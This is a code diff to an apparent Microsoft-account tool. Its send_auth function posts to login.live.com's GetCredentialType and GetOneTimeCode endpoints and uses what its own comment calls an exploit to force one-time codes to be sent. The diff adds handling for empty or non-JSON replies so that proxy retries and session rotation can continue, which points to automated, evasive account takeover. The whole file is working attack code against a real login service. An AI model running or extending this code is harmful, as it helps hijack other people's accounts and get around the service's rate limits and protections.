@@ -1,22 +1,27 @@
 from securing.utils.cookies.get_livedata import livedata
+import json
+import logging
+
 import httpx
 
-async def send_auth(session: httpx.AsyncClient, email: str, proof: str = None) -> dict | None:
+log = logging.getLogger(__name__)
 
+
+async def send_auth(session: httpx.AsyncClient, email: str, proof: str = None) -> dict | None:
     # GetCredential no longer forces OTPs
     # Uses a GetOneTimeCode exploit to force it
     send_auth = await session.post(
-        url = "https://login.live.com/GetCredentialType.srf",
-        headers = {
+        url="https://login.live.com/GetCredentialType.srf",
+        headers={
             "Accept": "application/json",
             "Accept-Encoding": "gzip, deflate, br, zstd",
             "Content-Type": "application/json; charset=utf-8",
             "Cookie": "MSPOK=$uuid-899fc7db-4aba-4e53-b33b-7b3268c26691",
             "Referer": "https://login.live.com/",
             "hpgact": "0",
-            "hpgid": "33"
+            "hpgid": "33",
         },
-        json = {
+        json={
             "checkPhones": True,
             "country": "",
             "federationFlags": 3,
@@ -32,29 +37,52 @@ async def send_auth(session: httpx.AsyncClient, email: str, proof: str = None) -
             "isRemoteNGCSupported": True,
             "isSignup": False,
             "otclogindisallowed": False,
-            "username": email
-        }
+            "username": email,
+        },
     )
-    
-    print(f"SendAuth Response: {send_auth.text}")
-    email_info = send_auth.json()
+
+    body = send_auth.text or ""
+    print(f"SendAuth Response: {body[:800]}")
+    if not body.strip():
+        # Empty body is almost always a dead proxy tunnel / MS flake — retryable.
+        log.error(
+            "send_auth: empty GetCredentialType response status=%s for %s",
+            send_auth.status_code,
+            email,
+        )
+        raise httpx.RemoteProtocolError(
+            f"GetCredentialType empty response (status={send_auth.status_code})"
+        )
+
+    try:
+        email_info = send_auth.json()
+    except json.JSONDecodeError as exc:
+        log.error(
+            "send_auth: non-JSON GetCredentialType status=%s for %s snippet=%r",
+            send_auth.status_code,
+            email,
+            body[:400],
+        )
+        # Treat as transport flake so proxy retry / SSID rotate can kick in.
+        raise httpx.RemoteProtocolError(
+            f"GetCredentialType non-JSON response (status={send_auth.status_code})"
+        ) from exc
 
     # There are secondary methods
     if "Credentials" in email_info:
-        
+
         # Authenticator Request
         if "RemoteNgcParams" in email_info["Credentials"]:
             return {
                 "type": "authenticator",
-                "response": email_info
+                "response": email_info,
             }
 
         # Email OTP Request
         if "OtcLoginEligibleProofs" in email_info["Credentials"]:
 
-
             altemaile = email_info["Credentials"]["OtcLoginEligibleProofs"][0]["data"]
-                        
+
             # Get the login PPFT
             live = await livedata(session)
             flowtoken = live["ppft"]
@@ -70,7 +98,7 @@ async def send_auth(session: httpx.AsyncClient, email: str, proof: str = None) -
                 "channel": "Email",
                 "ChallengeViewSupported": 1,
                 "AltEmailE": altemaile,
-                "lcid": 1033
+                "lcid": 1033,
             }
 
             if proof:
@@ -82,21 +110,18 @@ async def send_auth(session: httpx.AsyncClient, email: str, proof: str = None) -
                 payload["purpose"] = "eOTT_NoPasswordAccountLoginCode"
 
             await session.post(
-                url = "https://login.live.com/GetOneTimeCode.srf?id=38936",
-                headers = {
+                url="https://login.live.com/GetOneTimeCode.srf?id=38936",
+                headers={
                     "Accept": "application/json",
-                    "Content-type": "application/x-www-form-urlencoded"
+                    "Content-type": "application/x-www-form-urlencoded",
                 },
-                data = payload
+                data=payload,
             )
 
             return {
                 "type": "email",
                 "response": email_info,
-                "ppft": flowtoken
+                "ppft": flowtoken,
             }
-    
+
     return email_info
-    
-
-
